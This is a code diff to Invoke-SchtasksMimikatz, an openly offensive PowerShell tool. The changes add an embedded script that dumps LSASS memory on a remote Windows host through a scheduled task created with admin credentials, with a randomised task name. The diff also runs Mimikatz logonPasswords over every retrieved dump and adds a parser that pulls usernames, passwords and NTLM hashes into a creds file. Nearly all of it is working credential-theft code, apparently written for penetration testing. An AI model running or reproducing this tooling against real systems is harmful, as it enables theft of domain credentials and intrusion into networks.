@@ -64,15 +64,19 @@ Location of the procdump.ps1 script. By default the Invoke-SchtasksMimikatz trie
 
 .PARAMETER Taskname
 
-The name of the scheduled task to be created on the remote host. By default this is set to 'pd'.
+The name of the scheduled task to be created on the remote host. By default this is set to five random letters like (BfDGT).
 
 .EXAMPLE
 
 C:\PS> Invoke-SchtasksMimikatz -ComputerName 10.10.0.1 -Domain Testdomain -User AdminUser -Pass PassofAdmin1234
 
+.EXAMPLE
+
+C:\PS> Invoke-SchtasksMimikatz -ComputerName 10.10.0.1 -Domain Testdomain -User AdminUser -Pass PassofAdmin1234 -Taskname apt1 -ProcdumpLocation C:\temp\procdump.ps1 -LocalShareLetter Y:
+
 Description
 -----------
-This command will setup a share to the remote host at 10.10.0.1 using the administrative credentials of Testdomain\AdminUser user, copy over the procdump.ps1 file, schedule a task to run the procdump.ps1 to create a memory dump of LSASS, copy the lsass.dmp file back over to the testing system, then run Invoke-Mimikatz locally against the dump file.
+This command will setup a share to the remote host at 10.10.0.1 using the administrative credentials of Testdomain\AdminUser user specifying a taskname of apt1. Also, the ProcdumpLocation flag is specifying where the procdump.ps1 file is located on the user's system. The LocalShareLetter is telling the script to mount the share used to copy files to the target with the Y: drive letter.
 
 
 #>
@@ -103,7 +107,7 @@ Param(
 
  [Parameter(Position = 6, Mandatory = $false)]
  [string]
- $Taskname = "pd"
+ $Taskname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 
 )
 
@@ -132,7 +136,7 @@ Else {
     Break
 }
 
-    #Create a directory called pd on the remote host
+    #Create a directory called C:\pd on the remote host
 Write-Host "##### Making a dir called 'pd' on the remote host #####"
 $mkdir = "cmd.exe /C mkdir $LocalShareLetter\pd"
 Invoke-Expression -Command:$mkdir
@@ -151,9 +155,13 @@ Break
     #Attempting to locate the required procdump.ps1 file. If it finds it it proceeds in copying it to the remote share
 $PdPs1Exists = Test-Path $ProcdumpLocation
 If ($PdPs1Exists -eq $False) {
-    Write-Host "The procdump.ps1 file was not located at $ProcdumpLocation. By default Invoke-SchtasksMimikatz attempts to find this file on the local host at C:\pd\procdump.ps1. You can modify this with the '-ProcdumpLocation' flag." 
-    Invoke-Expression -Command:$cleanup_share
-Break
+    Write-Host "##### The procdump.ps1 file was not located at $ProcdumpLocation. Creating it now. #####"
+    $create_local_pd_dir = "cmd.exe /C mkdir C:\pd"
+    Invoke-Expression -Command:$create_local_pd_dir
+    Write-Output $procdump_script | add-content $ProcdumpLocation
+    Write-Host "##### Copying over procdump.ps1 to $LocalShareLetter\pd\ #####"
+    $copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\ #####"
+    Invoke-Expression -Command:$copy_procdump
 }
 Else {
     Write-Host "##### Copying over procdump.ps1 to $LocalShareLetter\pd\ #####"
@@ -201,31 +209,26 @@ else{
 }
 
     #Change names of LSASS dump files
-Write-Host "##### Changing name of dump file to lsass.dmp #####"
+Write-Host "##### Changing name of dump files to $ComputerName-lsass1.dmp #####"
 cd "C:\pd\$ComputerName-dumps"
-Get-ChildItem -Path "C:\pd\$ComputerName-dumps\" | ForEach-Object -begin { $count=1 } -process { rename-item $_ -NewName "lsass$count.dmp"; $count++ }
-#$change_name = "cmd.exe /C move C:\pd\$ComputerName-dumps\*.dmp C:\pd\$ComputerName-dumps\lsass.dmp"
-#Invoke-Expression -Command:$change_name
-
-
-    #Copying file to C:\pd to run mimikatz
-Write-Host "##### Copying lsass.dmp files to C:\pd\ for use with Mimikatz #####"
-$copy_to_pd = "cmd.exe /C copy C:\pd\$ComputerName-dumps\lsass1.dmp C:\pd\"
-Invoke-Expression -Command:$copy_to_pd
-
+Get-ChildItem -Path "C:\pd\$ComputerName-dumps\" | ForEach-Object -begin { $count=1 } -process { rename-item $_ -NewName "$ComputerName-lsass$count.dmp"; $count++ }
+cd "C:\pd\"
 
     #Running Invoke-Mimikatz against the dump
-Write-Host "##### Extracting credentials from lsass.dmp file with Mimikatz #####"
-Invoke-Mimikatz -Command '"sekurlsa::minidump C:\pd\lsass1.DMP" sekurlsa::logonPasswords exit >> report.txt'
+Write-Host "##### Extracting credentials from LSASS files with Mimikatz #####"
+$dumps = Get-ChildItem "C:\pd\$ComputerName-dumps\*.dmp"
+ForEach ($lsassfile in $dumps) {
+Invoke-Mimikatz -Command @" 
+"sekurlsa::minidump $($lsassfile.fullName)" sekurlsa::logonPasswords exit  
+"@ >> C:\pd\$ComputerName-dumps\mimikatz-report.txt
+}
 
+Write-Host "The full Mimikatz output has been written to C:\pd\$ComputerName-dumps\mimikatz-report.txt!!"
 Write-Host "##### Sleeping for 5 seconds #####"
 Start-Sleep -s 5
 
     #Cleaning up the local lsass1.dmp, remote pd directory, attached share, and remote scheduled task
 Write-Host "##### Starting cleanup on remote host #####"
-Write-Host "##### Removing lsass.dmp from pd directory on local host #####"
-$cleanup_local_system = "cmd.exe /C del C:\pd\lsass.dmp"
-Invoke-Expression -Command:$cleanup_local_system
 
 Write-Host "##### Removing C:\pd directory from remote host #####"
 $cleanup_remote_system = "cmd.exe /C rmdir /q /s $LocalShareLetter\pd"
@@ -241,11 +244,212 @@ Write-Host "##### Removing $LocalShareLetter share from local system #####"
 $cleanup_share = "cmd.exe /C net use $LocalShareLetter /delete"
 Invoke-Expression -Command:$cleanup_share
 
-Write-Host "##### Deleting $Taskname scheduled task on remote system #####"
-$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN $Taskname /F /S $ComputerName /U $Domain\$User /P $Pass"
-Invoke-Expression -Command:$cleanup_schtask
+Write-Host "##### Removing C:\pd\procdump.ps1 from local system #####"
+$cleanup_procdump = "cmd.exe /C del C:\pd\procdump.ps1"
+Invoke-Expression -Command:$cleanup_procdump
 
+Write-Host "##### Deleting $Taskname scheduled task on remote system #####"
+$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN $Taskname /F /S $ComputerName /U $Domain\$User /P $Pass 2>&1"
+$cleanup_schtask_output = Invoke-Expression -Command:$cleanup_schtask
+Write-Host $cleanup_schtask_output
+if ($cleanup_schtask_output -match "SUCCESS"){
+    Write-Host "Successfully deleted scheduled task" 
 }
+else{
+    Write-Host "Could not successfully remove schedule a task on the remote system. Manual removal may be necessary. Try the following command "schtasks /Delete /TN $Taskname /F /S $ComputerName /U $Domain\$User""
+break
+}
+
+
+Write-Host "Parsing Mimikatz Output"
+
+<#
+    The Mimikatz parser is from Invoke-MassMimikatz.ps1 by @enigma0x3 and @harmj0y. 
+    This can be found here: https://github.com/PowerShellEmpire/PowerTools/blob/master/PewPewPew/Invoke-MassMimikatz.ps1
+   #>
+# helper to parse out Mimikatz output
+$raw = [Io.File]::ReadAllText("C:\pd\$ComputerName-dumps\mimikatz-report.txt")
+            $creds = Parse-Mimikatz $raw
+            foreach($cred in $creds){
+                if ( ($cred) -and ($cred.Trim() -ne "")){
+                    $out = new-object psobject 
+                    $out | add-member Noteproperty 'Server' $ComputerName
+                    $out | add-member Noteproperty 'Credential' $cred
+                    $out | Tee-Object -Append -FilePath "C:\pd\creds.txt"
+                    }
+}
+}
+# Parse-Mimikatz function from Invoke-MassMimikatz.ps1 by @enigma0x3 and @harmj0y
+function Parse-Mimikatz {
+
+    [CmdletBinding()]
+    param(
+        [string]$raw
+    )
+    
+    # msv
+	$results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("NTLM")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)")){
+                    $username+"/"+$domain+":"+$password
+                }
+            }
+        }
+    }
+    $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Password")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)")){
+                    $username+"/"+$domain+":"+$password
+                }
+            }
+        }
+    }
+    $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Password")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)")){
+                    $username+"/"+$domain+":"+$password
+                }
+            }
+        }
+    }
+    $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Password")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)")){
+                    $username+"/"+$domain+":"+$password
+                }
+            }
+        }
+    }
+}
+
+$procdump_script = @'
+Set-Alias procdump Get-ProcessDump
+
+function Get-ProcessDump {
+  <#
+    .SYNOPSIS
+        Creates dump(s) ot trouble process(es).
+    .EXAMPLE
+        PS C:\>Get-ProcessDump (ps notepad)
+        Creates full memory dump(s) of Notepad process(es).
+    .EXAMPLE
+        PS C:\>ps notepad | procdump -pn E:\dbg -dt 0
+        Creates normal dump(s) of Notepad process(es) into E:\dbg folder.
+    .NOTES
+        Author: greg zakharov
+        Original script http://poshcode.org/4740
+        If you have a question send me a letter to
+        mailto:gregzakharov@bk.ru or mailto:grishanz@yandex.ru
+  #>
+  [CmdletBinding(DefaultParameterSetName="Processes", SupportsShouldProcess=$true)]
+  param(
+    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
+    [Diagnostics.Process[]]$Processes,
+    
+    [Parameter(Position=1)]
+    [ValidateScript({Test-Path $_})]
+    [Alias("pn")]
+    [String]$PathName = $pwd.Path,
+    
+    [Parameter(Position=2)]
+    [Alias("dt")]
+    [UInt32]$DumpType = 0x2
+  )
+  
+  begin {
+    $wer = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+    $mdt = $wer.GetNestedType('MiniDumpType', 'NonPublic')
+    $dbg = $wer.GetNestedType('NativeMethods', 'NonPublic').GetMethod(
+      'MiniDumpWriteDump', [Reflection.BindingFlags]'NonPublic, Static'
+    )
+  }
+  process {
+    $Processes | % {
+      if ($PSCmdlet.ShouldProcess($_.Name, "Create mini dump")) {
+        if (([Enum]::GetNames($mdt) | % {$mdt::$_.value__}) -notcontains $DumpType) {
+          Write-Host ("Unsupported mini dump type. The next types are available:`n" + (
+            [Enum]::GetNames($mdt) | % {"{0, 39} = 0x{1:x}`n" -f $_, $mdt::$_.value__}
+          )) -fo Red
+          break
+        }
+        
+        $dmp = Join-Path $PathName "$($_.Name)_$($_.Id)_$(date -u %d%m%Y_%H%M%S).dmp"
+        
+        try {
+          $fs = New-Object IO.FileStream($dmp, [IO.FileMode]::Create)
+          [void]$dbg.Invoke($null, @($_.Handle, $_.Id, $fs.SafeFileHandle, $DumpType,
+                                     [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))
+        }
+        finally {
+          if ($fs -ne $null) {$fs.Close()}
+        }
+      }
+    }
+  }
+  end {}
+}
+ps lsass | procdump -pn C:\pd\
+'@
+
+
+
+
 function Invoke-Mimikatz
 {
 <#
